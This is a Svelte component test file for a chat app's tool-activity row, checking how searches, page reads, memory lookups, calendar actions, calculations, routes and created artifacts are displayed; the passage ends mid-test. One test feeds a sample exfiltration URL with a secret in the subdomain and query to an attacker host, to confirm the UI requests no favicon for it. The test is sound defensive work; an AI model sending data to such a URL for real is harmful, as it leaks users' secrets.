import { readFileSync } from "node:fs";
import { fireEvent, render, within } from "@testing-library/svelte";
import { get } from "svelte/store";
import { beforeEach, describe, expect, it, vi } from "vitest";
import { t } from "$lib/i18n";
import { uiLanguage } from "$lib/stores/settings";
import {
	buildConnectorActivityItem,
	buildToolActivityItem,
	type ToolActivityItem,
} from "$lib/utils/tool-activity";
import type { ToolCallSegment } from "$lib/utils/tool-evidence-presentation";
import type { DeletedArtifacts } from "../artifacts/deleted-artifacts";
import {
	card as pictureCard,
	take as pictureTake,
} from "../artifacts/image/image-card-fixtures.test-helpers";
import ToolActivityRow from "./ToolActivityRow.svelte";

function toolCall(overrides: Partial<ToolCallSegment>): ToolCallSegment {
	return {
		type: "tool_call",
		name: "research_web",
		input: {},
		status: "done",
		...overrides,
	} as ToolCallSegment;
}

function item(
	overrides: Partial<ToolCallSegment>,
	key = "row-1",
): ToolActivityItem {
	return buildToolActivityItem(toolCall(overrides), key, get(t));
}

const searchSegment: Partial<ToolCallSegment> = {
	name: "research_web",
	input: { query: "cork weather" },
	candidates: [
		{
			id: "c1",
			title: "Cork city forecast",
			url: "https://met.ie/cork",
			sourceType: "web",
			status: "selected",
			snippet: "Saturday: wet and windy…",
		},
	] as ToolCallSegment["candidates"],
};

describe("ToolActivityRow", () => {
	beforeEach(() => {
		uiLanguage.set("en");
	});

	it("renders the row anatomy: status glyph, tool icon, verb, object and right-hand meta", () => {
		const { getByTestId } = render(ToolActivityRow, {
			item: item(searchSegment),
		});

		const row = getByTestId("tool-activity-row");
		expect(row.dataset.status).toBe("done");
		expect(row.dataset.iconType).toBe("web-search");
		expect(row.querySelector(".act-status")).not.toBeNull();
		expect(row.querySelector('[data-tool-icon="web-search"]')).not.toBeNull();
		expect(row.querySelector(".act-verb")?.textContent).toBe("Searched");
		expect(row.querySelector(".act-object")?.textContent).toBe("cork weather");
		expect(row.querySelector(".act-meta")?.textContent).toBe("1 source");
	});

	it("marks a running row so its spinner and live verb sweep can play", () => {
		const { getByTestId } = render(ToolActivityRow, {
			item: item({ ...searchSegment, status: "running" }),
		});
		const row = getByTestId("tool-activity-row");
		expect(row.classList.contains("is-running")).toBe(true);
		expect(row.querySelector(".act-status.running")).not.toBeNull();
	});

	it("shows a failed row with the danger word and the tool's own sentence, keeping the normal label, and never the raw failure text", () => {
		const { getByTestId, container } = render(ToolActivityRow, {
			item: item({
				name: "fetch_url",
				input: { url: "https://weather.metoffice.gov.uk" },
				status: "failed",
				metadata: { error: "request timed out after 20 s" },
			}),
			open: true,
		});

		const row = getByTestId("tool-activity-row");
		expect(row.classList.contains("is-failed")).toBe(true);
		expect(row.querySelector(".act-status.failed")).not.toBeNull();
		expect(row.querySelector(".act-meta")?.textContent).toBe("Failed");
		// The label is the one a SUCCESSFUL read would have had — only the
		// glyph and the right-hand word change.
		expect(row.querySelector(".act-verb")?.textContent).toBe("Read");
		expect(row.querySelector(".act-object")?.textContent).toBe(
			"weather.metoffice.gov.uk",
		);
		// What happened, once, in words: a sentence of ours, not the tool's error
		// text, which is the log's and the model's.
		expect(getByTestId("tool-activity-reason")).toHaveTextContent(
			"The page couldn't be read.",
		);
		expect(container).not.toHaveTextContent("request timed out after 20 s");
	});

	it("draws a stop on purpose as the quiet dash with its sentence, and no Failed", () => {
		const { getByTestId } = render(ToolActivityRow, {
			item: item({
				name: "research_web",
				input: { query: "cork weather" },
				status: "failed",
				metadata: { reasonCode: "reading_budget_used" },
			}),
			open: true,
		});

		const row = getByTestId("tool-activity-row");
		expect(row.dataset.status).toBe("skipped");
		expect(row.classList.contains("is-failed")).toBe(false);
		expect(row.querySelector(".act-status.skipped")).not.toBeNull();
		expect(row.querySelector(".act-status.failed")).toBeNull();
		expect(row.querySelector(".act-meta")).toBeNull();
		expect(getByTestId("tool-activity-reason")).toHaveTextContent(
			"Alfy had already searched enough for this reply.",
		);
	});

	it("says nothing found on the row itself, and then has nothing to open", () => {
		const { getByTestId, queryByTestId } = render(ToolActivityRow, {
			item: item({
				name: "memory_context",
				input: { query: "dentist appointment" },
				status: "done",
				metadata: { reasonCode: "nothing_found" },
			}),
			open: true,
		});

		const row = getByTestId("tool-activity-row");
		expect(row.dataset.status).toBe("done");
		expect(row.tagName.toLowerCase()).toBe("div");
		expect(row.querySelector(".act-chevron")).toBeNull();
		expect(row.querySelector(".act-meta")?.textContent).toBe("nothing found");
		expect(queryByTestId("tool-activity-body")).toBeNull();
	});

	it("says it in Hungarian in a Hungarian turn", () => {
		uiLanguage.set("hu");
		const { getByTestId } = render(ToolActivityRow, {
			item: item({
				name: "fetch_url",
				input: { url: "https://weather.metoffice.gov.uk" },
				status: "failed",
				metadata: { reasonCode: "site_timeout" },
			}),
			open: true,
		});

		const row = getByTestId("tool-activity-row");
		expect(row.querySelector(".act-meta")?.textContent).toBe("Sikertelen");
		expect(getByTestId("tool-activity-reason")).toHaveTextContent(
			"Az oldal nem válaszolt időben.",
		);
	});

	// docs/plans/exfil-channels: the favicon of a host the call returned is asked of the
	// app's proxy; the host of an address the call was only GIVEN is the model's word,
	// and the row shows the globe and asks for nothing.
	it("asks for the favicon of a host a call returned, and shows the globe for one it was only given", () => {
		const returned = render(ToolActivityRow, {
			item: item({
				name: "fetch_url",
				input: { url: "https://met.ie/cork" },
				candidates: [
					{
						id: "c1",
						title: "Cork city forecast",
						url: "https://met.ie/cork",
						sourceType: "web",
					},
				] as ToolCallSegment["candidates"],
			}),
			open: true,
		});
		const favicon = returned
			.getByTestId("tool-activity-body")
			.querySelector<HTMLImageElement>(".act-favicon img");
		expect(favicon?.getAttribute("src")).toBe("/api/favicon?domain=met.ie");
		returned.unmount();

		const given = render(ToolActivityRow, {
			item: item({
				name: "fetch_url",
				input: { url: "https://secret-0123abcd.attacker.test/page?d=SECRET" },
			}),
			open: true,
		});
		const body = given.getByTestId("tool-activity-body");
		expect(body.querySelector("a.act-src")).not.toBeNull();
		expect(body.querySelector("img")).toBeNull();
		expect(
			body.querySelector(".act-favicon .act-favicon-globe"),
		).not.toBeNull();
		expect(body.innerHTML).not.toContain("/api/favicon");
	});

	it("is a button with a chevron only when it has a body, and toggles that body on click", async () => {
		const onToggle = vi.fn();
		const { getByTestId, queryByTestId, rerender } = render(ToolActivityRow, {
			item: item(searchSegment),
			open: false,
			onToggle,
		});

		const row = getByTestId("tool-activity-row");
		expect(row.tagName.toLowerCase()).toBe("button");
		expect(row.getAttribute("aria-expanded")).toBe("false");
		expect(row.querySelector(".act-chevron")).not.toBeNull();
		expect(queryByTestId("tool-activity-body")).toBeNull();

		await fireEvent.click(row);
		expect(onToggle).toHaveBeenCalledWith("row-1");

		// The open state is owned by the caller, so re-render with it applied:
		// the body appears and the row squares off its bottom corners (is-open),
		// which is what visually joins the two into one block.
		await rerender({ item: item(searchSegment), open: true, onToggle });
		const openRow = getByTestId("tool-activity-row");
		expect(openRow.getAttribute("aria-expanded")).toBe("true");
		expect(openRow.classList.contains("is-open")).toBe(true);
		expect(queryByTestId("tool-activity-body")).not.toBeNull();

		// …and closing it again removes both.
		await rerender({ item: item(searchSegment), open: false, onToggle });
		expect(getByTestId("tool-activity-row").classList.contains("is-open")).toBe(
			false,
		);
	});

	it("never renders a row with nothing to reveal as clickable", () => {
		const { getByTestId } = render(ToolActivityRow, {
			item: item({ name: "some_new_tool", input: {} }),
		});
		const row = getByTestId("tool-activity-row");
		expect(row.tagName.toLowerCase()).toBe("div");
		expect(row.querySelector(".act-chevron")).toBeNull();
	});

	it("renders a search body as a source list with the cited tick and the hover excerpt", () => {
		const { getByTestId } = render(ToolActivityRow, {
			item: item(searchSegment),
			open: true,
		});

		const body = getByTestId("tool-activity-body");
		expect(body.querySelector(".act-eyebrow")?.textContent).toContain(
			"Sources",
		);
		expect(body.querySelector(".act-eyebrow")?.textContent).toContain(
			"1 cited",
		);
		const source = body.querySelector<HTMLAnchorElement>("a.act-src");
		expect(source?.getAttribute("href")).toBe("https://met.ie/cork");
		expect(source?.querySelector(".act-src-title")?.textContent).toBe(
			"Cork city forecast",
		);
		expect(source?.querySelector(".act-src-cited")).not.toBeNull();
		expect(
			source?.querySelector(".act-src-popover-reason")?.textContent,
		).toContain("Saturday: wet and windy");
	});

	// The popover used to be `display: none` until :hover, which cannot
	// animate — it popped in and out. It is now always laid out and animates
	// its opacity/transform, with `visibility` (not `display`) carrying the
	// hidden semantics so it stays out of hit-testing and the a11y tree.
	// jsdom applies no component CSS, so the stylesheet itself is the subject
	// here — the same approach reduced-motion-transitions.regression.test.ts
	// takes for style-only guarantees.
	it("keeps the source popover mounted and hidden by visibility, not display", () => {
		const { getByTestId } = render(ToolActivityRow, {
			item: item(searchSegment),
			open: true,
		});

		const popover =
			getByTestId("tool-activity-body").querySelector(".act-src-popover");
		// Rendered up front (nothing waits for a hover to create it) and
		// hidden from assistive tech, since the row's `title` already says it.
		expect(popover).not.toBeNull();
		expect(popover?.getAttribute("aria-hidden")).toBe("true");

		const source = readFileSync(
			`${process.cwd()}/src/lib/components/chat/ToolActivityRow.svelte`,
			"utf-8",
		);
		const hiddenRule =
			source.match(/\n\t\.act-src-popover \{([\s\S]*?)\n\t\}/)?.[1] ?? "";
		expect(hiddenRule).not.toBe("");
		expect(hiddenRule).not.toMatch(/display:\s*none/);
		expect(hiddenRule).toMatch(/opacity:\s*0/);
		expect(hiddenRule).toMatch(/visibility:\s*hidden/);
		expect(hiddenRule).toMatch(/transform:\s*translateY\(-4px\)/);
		expect(hiddenRule).toMatch(/pointer-events:\s*none/);
		// Both directions animate: the transition lives on the hidden state
		// (fade-out) as well as the shown one (fade-in), at the app's standard
		// duration and easing, with `visibility` stepping only at the end.
		expect(hiddenRule).toMatch(
			/transition:\s*opacity var\(--duration-standard\) var\(--ease-out\)/,
		);
		expect(hiddenRule).toMatch(
			/visibility 0s linear var\(--duration-standard\)/,
		);

		const shownRule =
			source.match(
				/\.act-src:hover \.act-src-popover,\n\t\.act-src:focus-visible \.act-src-popover \{([\s\S]*?)\n\t\}/,
			)?.[1] ?? "";
		expect(shownRule).not.toBe("");
		expect(shownRule).toMatch(/opacity:\s*1/);
		expect(shownRule).toMatch(/visibility:\s*visible/);
		expect(shownRule).toMatch(/transform:\s*translateY\(0\)/);
		expect(shownRule).toMatch(
			/transition:\s*opacity var\(--duration-standard\) var\(--ease-out\)/,
		);

		// Reduced motion keeps the fade but drops the slide.
		const reducedMotionBlock =
			source.match(
				/@media \(prefers-reduced-motion: reduce\) \{([\s\S]*?)\n\t\}\n<\/style>/,
			)?.[1] ?? "";
		expect(reducedMotionBlock).toMatch(
			/\.act-src-popover,[\s\S]*?transform:\s*none/,
		);
	});

	it("renders a connector group body as one row per action", () => {
		const tools = [
			toolCall({ name: "calendar", input: { action: "list_events" } }),
			toolCall({
				name: "calendar",
				input: { action: "create_event" },
				status: "failed",
			}),
		];
		const { getAllByTestId } = render(ToolActivityRow, {
			item: buildConnectorActivityItem(tools, "group-1", get(t)),
			open: true,
		});

		const actions = getAllByTestId("tool-activity-action");
		expect(actions).toHaveLength(2);
		expect(actions[0].textContent).toContain("Looked at your events");
		expect(actions[1].querySelector(".act-status.failed")).not.toBeNull();
	});

	it("draws an account run as each call in plain words with what it found, the things by name, and the reason a call did not work", () => {
		const { getAllByTestId, getByTestId, container } = render(ToolActivityRow, {
			item: buildConnectorActivityItem(
				[
					toolCall({
						name: "calendar",
						input: { action: "list_events" },
						metadata: { ok: true, eventCount: 6 },
						candidates: Array.from({ length: 6 }, (_, index) => ({
							id: `calendar:${index}`,
							title: `Event ${index + 1}`,
							sourceType: "tool",
							metadata: { start: "2026-11-19T10:00:00Z" },
						})) as ToolCallSegment["candidates"],
					}),
					toolCall({
						name: "calendar",
						input: { action: "create_event" },
						metadata: { ok: false, reasonCode: "writes_turned_off" },
					}),
				],
				"group-2",
				get(t),
				{ locale: "en-GB", timeZone: "UTC" },
			),
			open: true,
		});

		const calls = getAllByTestId("tool-activity-action");
		expect(calls).toHaveLength(2);
		expect(calls[0].textContent).toContain("Looked at your events");
		expect(calls[0].querySelector(".act-action-sub")?.textContent).toBe(
			"6 found",
		);
		expect(calls[1].querySelector(".act-status.skipped")).not.toBeNull();
		expect(
			getAllByTestId("tool-activity-thing").map((thing) =>
				thing.textContent?.replace(/\s+/g, " ").trim(),
			),
		).toEqual([
			"Event 1 Thu 10:00",
			"Event 2 Thu 10:00",
			"Event 3 Thu 10:00",
			"Event 4 Thu 10:00",
			"Event 5 Thu 10:00",
		]);
		expect(getByTestId("tool-activity-more")).toHaveTextContent("and 1 more");
		expect(getByTestId("tool-activity-reason")).toHaveTextContent(
			"Changing your calendar is turned off. You can turn it on in Settings › Connections.",
		);
		// The calendar's own glyph stands before each thing it found.
		expect(
			container.querySelectorAll(
				'[data-testid="tool-activity-thing"] [data-tool-icon="calendar"]',
			),
		).toHaveLength(5);
	});

	it("renders a memory body as bullets", () => {
		const { getByTestId } = render(ToolActivityRow, {
			item: item({
				name: "memory_context",
				input: {},
				candidates: [
					{ id: "m1", title: "Prefers Celsius", sourceType: "memory" },
				] as ToolCallSegment["candidates"],
			}),
			open: true,
		});
		expect(
			getByTestId("tool-activity-body").querySelectorAll("ul.act-bullets li"),
		).toHaveLength(1);
	});

	// The two sentences that used to open every body ("Searched “…”." / "Found 6
	// results.") repeated the row, and the Details box held the call's raw argument
	// names, its model-facing result and a second copy of a failure's reason. A
	// body is now only what the tool found, or one sentence about what happened.
	it("an opened row shows no summary sentences and no Details", () => {
		const segments: Partial<ToolCallSegment>[] = [
			{
				name: "research_web",
				input: { query: "cork weather" },
				candidates: [
					{
						id: "c1",
						title: "Cork city forecast",
						url: "https://met.ie/cork",
						sourceType: "web",
					},
				] as ToolCallSegment["candidates"],
			},
			{
				name: "fetch_url",
				input: { url: "https://weather.metoffice.gov.uk" },
				status: "failed",
				metadata: { error: "request timed out after 20 s" },
				outputSummary: "request timed out after 20 s",
			},
			{
				name: "some_new_tool",
				input: { thing: "value" },
				outputSummary: "it worked",
			},
			{
				name: "memory_context",
				input: { query: "dentist" },
				candidates: [
					{ id: "m1", title: "Prefers Celsius", sourceType: "memory" },
				] as ToolCallSegment["candidates"],
			},
			{
				name: "run_python",
				input: { code: "# total\nprint(1)" },
				outputSummary: "run_python finished: exit code 0, 1 stdout chars.",
			},
		];
		for (const segment of segments) {
			const { container, unmount } = render(ToolActivityRow, {
				item: item(segment),
				open: true,
			});
			for (const testId of [
				"tool-activity-summary-text",
				"tool-activity-summary-reason",
				"tool-activity-details",
				"tool-activity-error",
			]) {
				expect(
					container.querySelector(`[data-testid="${testId}"]`),
					`${segment.name} ${testId}`,
				).toBeNull();
			}
			expect(
				container.querySelector(
					".act-summary, .act-details, .act-kv, details, summary",
				),
				`${segment.name} markup`,
			).toBeNull();
			unmount();
		}
	});

	it("draws an unknown tool's row with no body, so it is no button and has no chevron", () => {
		const { getByTestId, queryByTestId } = render(ToolActivityRow, {
			item: item({
				name: "some_new_tool",
				input: { thing: "value" },
				outputSummary: "it worked",
			}),
			open: true,
		});

		expect(queryByTestId("tool-activity-body")).toBeNull();
		const row = getByTestId("tool-activity-row");
		expect(row.tagName.toLowerCase()).toBe("div");
		expect(row.querySelector(".act-chevron")).toBeNull();
		expect(row).not.toHaveTextContent("it worked");
	});

	describe("the bodies that say what a tool found", () => {
		const foundPictures = (count: number) =>
			Array.from({ length: count }, (_, index) => ({
				id: `img${index}`,
				title: `Harbour ${index + 1}`,
				url: `https://images.example${index}.test/h.jpg`,
				snippet: `site${index}.com`,
				sourceType: "web",
				metadata: {
					source: `site${index}.com`,
					thumbnail: `https://saved-thumbnails.example/thumb${index}`,
				},
			})) as ToolCallSegment["candidates"];

		it("draws the pictures a picture search found as small thumbnails with their sites, through the app's own route", () => {
			const { getByTestId, getAllByTestId, container } = render(
				ToolActivityRow,
				{
					item: item({
						name: "image_search",
						input: { query: "harbour at dawn" },
						candidates: foundPictures(3),
					}),
					open: true,
				},
			);

			expect(
				getByTestId("tool-activity-row").querySelector(".act-meta")
					?.textContent,
			).toBe("3 pictures");
			const thumbs = getAllByTestId("tool-activity-thumb");
			expect(thumbs).toHaveLength(3);
			const image = thumbs[0].querySelector("img") as HTMLImageElement;
			expect(image.getAttribute("src")).toBe(
				`/api/image-search/thumbnail?url=${encodeURIComponent("https://images.example0.test/h.jpg")}`,
			);
			expect(image.getAttribute("referrerpolicy")).toBe("no-referrer");
			expect(image.getAttribute("alt")).toBe("Harbour 1");
			expect(thumbs[0].querySelector("figcaption")?.textContent).toBe(
				"site0.com",
			);
			// No address of the search's own is ever requested.
			expect(container.innerHTML).not.toContain(
				'saved-thumbnails.example/thumb0"',
			);
			expect(container.innerHTML).not.toContain(
				'src="https://images.example0.test',
			);
		});

		it("keeps the publisher link accessible when a Parallel preview fails", async () => {
			const url = "https://images.example/harbour.jpg";
			const sourcePageUrl = "https://publisher.example/gallery";
			const view = render(ToolActivityRow, {
				item: item({
					name: "image_search",
					candidates: [
						{
							id: "harbour",
							title: "Harbour",
							sourceType: "web",
							url,
							metadata: {
								provider: "parallel",
								source: "publisher.example",
								sourcePageUrl,
								thumbnail: url,
							},
						},
					],
				}),
				open: true,
			});
			await fireEvent.error(view.getByAltText("Harbour"));
			expect(view.queryByAltText("Harbour")).toBeNull();
			expect(
				view.getByRole("link", { name: "publisher.example" }),
			).toHaveAttribute("href", sourcePageUrl);
		});

		it("hides a thumbnail that fails to load, and keeps the others", async () => {
			const { getAllByTestId, queryAllByTestId } = render(ToolActivityRow, {
				item: item({
					name: "image_search",
					input: { query: "harbour at dawn" },
					candidates: foundPictures(3),
				}),
				open: true,
			});

			const second = getAllByTestId("tool-activity-thumb")[1];
			await fireEvent.error(second.querySelector("img") as HTMLImageElement);

			expect(queryAllByTestId("tool-activity-thumb")).toHaveLength(2);
			expect(second.isConnected).toBe(false);
		});

		it("lists the past chats a memory lookup looked through by their titles, and says how many more", () => {
			const { getAllByTestId, getByTestId, queryByTestId } = render(
				ToolActivityRow,
				{
					item: item({
						name: "memory_context",
						input: { mode: "history", query: "trips" },
						metadata: { mode: "history", ok: true },
						candidates: Array.from({ length: 8 }, (_, index) => ({
							id: `c${index}`,
							title: `Trip chat ${index + 1}`,
							sourceType: "memory",
						})) as ToolCallSegment["candidates"],
					}),
					open: true,
				},
			);

			const row = getByTestId("tool-activity-row");
			expect(row.querySelector(".act-verb")?.textContent).toBe(
				"Looked through",
			);
			expect(row.querySelector(".act-object")?.textContent).toBe(
				"8 past chats",
			);
			const things = getAllByTestId("tool-activity-thing");
			expect(things.map((thing) => thing.textContent?.trim())).toEqual([
				"Trip chat 1",
				"Trip chat 2",
				"Trip chat 3",
				"Trip chat 4",
				"Trip chat 5",
			]);
			expect(getByTestId("tool-activity-more")).toHaveTextContent("and 3 more");
			expect(queryByTestId("tool-activity-thumbs")).toBeNull();
		});

		it("says 'and 3 more' in Hungarian as 'és még 3'", () => {
			uiLanguage.set("hu");
			const { getByTestId } = render(ToolActivityRow, {
				item: item({
					name: "memory_context",
					input: { mode: "history", query: "utak" },
					metadata: { mode: "history", ok: true },
					candidates: Array.from({ length: 8 }, (_, index) => ({
						id: `c${index}`,
						title: `Utazás ${index + 1}`,
						sourceType: "memory",
					})) as ToolCallSegment["candidates"],
				}),
				open: true,
			});
			expect(getByTestId("tool-activity-more")).toHaveTextContent("és még 3");
		});

		it("draws what a calculation printed as plain text, with no program and no heading", () => {
			const { getByTestId, container } = render(ToolActivityRow, {
				item: item({
					name: "run_python",
					input: { code: "# total\nprint('monthly: 312,893 Ft')" },
					outputSummary: "run_python finished: exit code 0, 41 stdout chars.",
					metadata: {
						displayOutput: "monthly: 312,893 Ft\ntotal: 33,094,440 Ft",
					},
				}),
				open: true,
			});

			const result = getByTestId("tool-activity-result");
			expect(result.textContent).toBe(
				"monthly: 312,893 Ft\ntotal: 33,094,440 Ft",
			);
			// Plain text in the body's own face, not a code box: lines kept, long
			// ones wrapped (jsdom does not apply the component's scoped style).
			const source = readFileSync(
				`${process.cwd()}/src/lib/components/chat/ToolActivityRow.svelte`,
				"utf-8",
			);
			const rule =
				source.match(/\n\t\.act-result \{([\s\S]*?)\n\t\}/)?.[1] ?? "";
			expect(rule).toContain("white-space: pre-wrap");
			expect(rule).toContain("font-family: var(--font-sans)");
			expect(rule).not.toContain("mono");
			expect(container.querySelector(".act-code, .act-eyebrow")).toBeNull();
			expect(container).not.toHaveTextContent("print(");
			expect(container).not.toHaveTextContent("stdout chars");
		});

		it("does not open a calculation that printed nothing", () => {
			const { getByTestId, queryByTestId } = render(ToolActivityRow, {
				item: item({
					name: "run_python",
					input: { code: "# total\nx = 1" },
					outputSummary: "run_python finished: exit code 0, 0 stdout chars.",
				}),
				open: true,
			});
			expect(getByTestId("tool-activity-row").tagName.toLowerCase()).toBe(
				"div",
			);
			expect(queryByTestId("tool-activity-body")).toBeNull();
		});
	});

	it("draws a reason body as one sentence, no heading, no box", () => {
		const { getByTestId } = render(ToolActivityRow, {
			item: {
				...item({ name: "make_image", input: { title: "Logo" } }),
				status: "failed",
				body: { kind: "reason", text: "The picture could not be made." },
			},
			open: true,
		});

		const body = getByTestId("tool-activity-body");
		expect(body.querySelectorAll("p")).toHaveLength(1);
		expect(getByTestId("tool-activity-reason")).toHaveTextContent(
			"The picture could not be made.",
		);
		expect(body.querySelector("details, pre, .act-eyebrow")).toBeNull();
	});

	it("lists the transit itinerary legs above the map", () => {
		const { getByTestId, queryByTestId } = render(ToolActivityRow, {
			item: item({
				name: "map_route",
				input: { action: "transit" },
				map: {
					bounds: { minLat: 49.3, minLng: 8.6, maxLat: 49.5, maxLng: 8.8 },
					durationS: 1620,
					mode: "transit",
					transfers: 1,
					originLabel: "Dossenheim",
					destinationLabel: "Heidelberg",
					transitLegs: [
						{
							type: "walk",
							depart: "08:25",
							arrive: "08:28",
							minutes: 3,
							distanceM: 220,
						},
						{
							type: "pt",
							line: "39A",
							headsign: "Bismarckplatz",
							from: "Dossenheim, Süd",
							to: "Heidelberg, Alois-Link-Platz",
							depart: "08:31",
							arrive: "08:50",
							stops: 7,
							minutes: 19,
						},
					],
					attribution: "© OpenStreetMap contributors",
				},
			} as Partial<ToolCallSegment>),
			open: true,
		});

		// The body is the route itinerary now: a timeline row per leg plus the
		// arrival, with the line, headsign and stop count on the ride.
		const timeline = getByTestId("itinerary-timeline");
		expect(
			timeline.querySelectorAll("[data-testid='itinerary-leg']"),
		).toHaveLength(3);
		const text = timeline.textContent ?? "";
		expect(text).toContain("08:31");
		expect(text).toContain("39A");
		expect(text).toContain("Dossenheim, Süd");
		expect(text).toContain("Heidelberg, Alois-Link-Platz");
		expect(text).toContain("Bismarckplatz");
		expect(text).toContain("7 stops");
		// The walk leg is named rather than left blank.
		expect(text).toContain("Walk");
		expect(queryByTestId("itinerary-departure")).toBeNull();
	});

	it("lists the next departures for a timetable call", () => {
		const { getAllByTestId, queryByTestId } = render(ToolActivityRow, {
			item: item({
				name: "map_route",
				input: { action: "timetable" },
				map: {
					bounds: { minLat: 0, minLng: 0, maxLat: 1, maxLng: 1 },
					durationS: 1620,
					mode: "transit",
					transfers: 1,
					originLabel: "A",
					destinationLabel: "B",
					departures: [
						{
							depart: "08:25",
							arrive: "08:52",
							minutes: 27,
							transfers: 1,
							line: "39A",
						},
						{ depart: "08:45", arrive: "09:12", minutes: 27, transfers: 0 },
					],
					attribution: "© OpenStreetMap contributors",
				},
			} as Partial<ToolCallSegment>),
			open: true,
		});

		const rows = getAllByTestId("itinerary-departure");
		expect(rows).toHaveLength(2);
		const text = rows.map((row) => row.textContent ?? "").join(" ");
		expect(text).toContain("08:25");
		expect(text).toContain("08:52");
		expect(text).toContain("1 change");
		expect(text).toContain("0 changes");
		expect(queryByTestId("itinerary-timeline")).toBeNull();
	});

	it("localizes the row grammar with the UI language", () => {
		uiLanguage.set("hu");
		try {
			const { getByTestId } = render(ToolActivityRow, {
				item: item(searchSegment),
			});
			expect(
				getByTestId("tool-activity-row").querySelector(".act-verb")
					?.textContent,
			).toBe("Keresés");
		} finally {
			uiLanguage.set("en");
		}
	});

	// The in-chat card for Document/App/Canvas/Slides (cross-kind task, after
	// Slice 1's merge): a successful create_artifact/edit_artifact renders
	// ArtifactCard as this row's body, for every kind — a refused or failed
	// call never does.
	describe("create_artifact / edit_artifact — the in-chat card", () => {
		function artifactSegment(overrides: Partial<ToolCallSegment> = {}) {
			return toolCall({
				name: "create_artifact",
				input: { artifactType: "document", title: "Weekend plan" },
				status: "done",
				metadata: {
					ok: true,
					artifactId: "artifact-1",
					artifactKind: "document",
					artifactTitle: "Weekend plan",
				},
				...overrides,
			});
		}

		it("renders the card, already open, for a successful create_artifact — one card per kind", () => {
			const kinds: Array<"document" | "app" | "canvas" | "slides"> = [
				"document",
				"app",
				"canvas",
				"slides",
			];
			for (const kind of kinds) {
				const { getByTestId, unmount } = render(ToolActivityRow, {
					item: buildToolActivityItem(
						artifactSegment({
							metadata: {
								ok: true,
								artifactId: `artifact-${kind}`,
								artifactKind: kind,
								artifactTitle: `My ${kind}`,
							},
						}),
						`row-${kind}`,
						get(t),
					),
				});
				expect(getByTestId("artifact-card")).toBeInTheDocument();
				// The title lives on the row's own line — chrome="body" draws no
				// title of its own (see the "does not repeat the title" test
				// below), so the card is identified by its testid, not by text
				// that would otherwise be duplicated.
				expect(getByTestId("tool-activity-row")).toHaveTextContent(
					`My ${kind}`,
				);
				unmount();
			}
		});

		// Wave 2.5 Step 12 deliberately overturns slice-0's old "no title of its
		// own" contract for THIS chrome (chrome="body" → chrome="full"): the
		// approved mockup's `.a-card` repeats the title on purpose — once on
		// the tool row's compact status line, once on the card's own head — so
		// the card reads as a standalone deliverable next to the chat rather
		// than a nested log entry. See ArtifactCard.svelte's header comment.
		// (chrome="body" itself is untouched: the File kind's own "exactly
		// once" contract, covered elsewhere in this file, still holds.)
		it("repeats the title once on the row's compact line and once on the standalone card's own head", () => {
			const { container, getByTestId } = render(ToolActivityRow, {
				item: buildToolActivityItem(artifactSegment(), "row-title", get(t)),
			});
			// The row's own line already reads "Created Weekend plan" (verb +
			// object) — ToolActivityRow's rowContents() always renders it.
			expect(getByTestId("tool-activity-row")).toHaveTextContent(
				"Weekend plan",
			);
			// The standalone card renders through its own wrapper, never inside
			// the row-joined `.act-body` (Wave 2.5 Step 12).
			expect(getByTestId("tool-activity-standalone-card")).toBeInTheDocument();
			expect(within(container).getAllByText("Weekend plan")).toHaveLength(2);
		});

		it("renders no card for a refused edit_artifact — the row still shows what happened", () => {
			const { queryByTestId, getByTestId } = render(ToolActivityRow, {
				item: buildToolActivityItem(
					artifactSegment({
						name: "edit_artifact",
						status: "done",
						outputSummary: "Apps are not edited in place.",
						metadata: {
							ok: false,
							artifactId: "artifact-1",
							artifactKind: "app",
						},
					}),
					"row-refused",
					get(t),
				),
				open: true,
			});
			expect(queryByTestId("artifact-card")).not.toBeInTheDocument();
			expect(getByTestId("tool-activity-row")).toBeInTheDocument();
		});

		it("Open builds a minimal ready-to-open item from the card's own metadata and passes the conversation id", async () => {
			const onOpenDocument = vi.fn();
			const { getByTestId } = render(ToolActivityRow, {
				item: buildToolActivityItem(artifactSegment(), "row-open", get(t)),
				onOpenDocument,
				conversationId: "conv-42",
			});

			// chrome="full"'s head is one button (redesign §5.2), so its
			// accessible name is the whole head's text, not the bare word
			// "Open" — click by the head's own testid instead.
			await fireEvent.click(getByTestId("artifact-card-head"));

			expect(onOpenDocument).toHaveBeenCalledWith(
				expect.objectContaining({
					artifactId: "artifact-1",
					kind: "document",
					title: "Weekend plan",
					conversationId: "conv-42",
				}),
			);
		});

		// Redesign §5.2, Wave 2.5 Step 12: "after an edit ... 'Review ›'" —
		// mirrors `DocumentWorkspace.svelte`'s own `pendingReviewCount` formula
		// exactly (same ephemeral `alfyActivity` signal, matched by artifactId).
		it("shows the pending-review pill and 'Review' when alfyActivity is about this card's own artifact", () => {
			const { getByTestId } = render(ToolActivityRow, {
				item: buildToolActivityItem(artifactSegment(), "row-review", get(t)),
				alfyActivity: {
					key: "call-1",
					artifactId: "artifact-1",
					toolName: "edit_artifact",
					status: "applied",
					label: null,
					patches: [],
					refusedBlocks: [],
					appliedCount: 2,
				},
			});

			const head = getByTestId("artifact-card-head");
			expect(head).toHaveTextContent("2 changes to review");
			expect(head).toHaveTextContent("Review");
		});

		// Redesign §4.2 "The chat side", Wave 2.5 Step 11: the two pills are
		// independent signals shown side by side.
		it("shows both the pending-review and left-alone pills for a partial refusal", () => {
			const { getByTestId } = render(ToolActivityRow, {
				item: buildToolActivityItem(artifactSegment(), "row-partial", get(t)),
				alfyActivity: {
					key: "call-1",
					artifactId: "artifact-1",
					toolName: "edit_artifact",
					status: "refused",
					label: null,
					patches: [],
					refusedBlocks: [{ blockId: "p2", reason: "block_changed" }],
					appliedCount: 1,
				},
			});

			const head = getByTestId("artifact-card-head");
			expect(head).toHaveTextContent("1 change to review");
			expect(head).toHaveTextContent("1 part left alone");
			expect(head).toHaveTextContent("Review");
		});

		// A fully refused call has nothing applied — the card must not claim
		// "N changes to review" for zero applied changes (the old
		// `Math.max(appliedCount, 1)` stopgap this pill replaces did).
		it("shows only the left-alone pill, still with 'Review', for a full refusal", () => {
			const { getByTestId } = render(ToolActivityRow, {
				item: buildToolActivityItem(
					artifactSegment(),
					"row-full-refusal",
					get(t),
				),
				alfyActivity: {
					key: "call-1",
					artifactId: "artifact-1",
					toolName: "edit_artifact",
					status: "refused",
					label: null,
					patches: [],
					refusedBlocks: [{ blockId: "p1", reason: "block_changed" }],
					appliedCount: 0,
				},
			});

			const head = getByTestId("artifact-card-head");
			expect(head).not.toHaveTextContent("change to review");
			expect(head).toHaveTextContent("1 part left alone");
			expect(head).toHaveTextContent("Review");
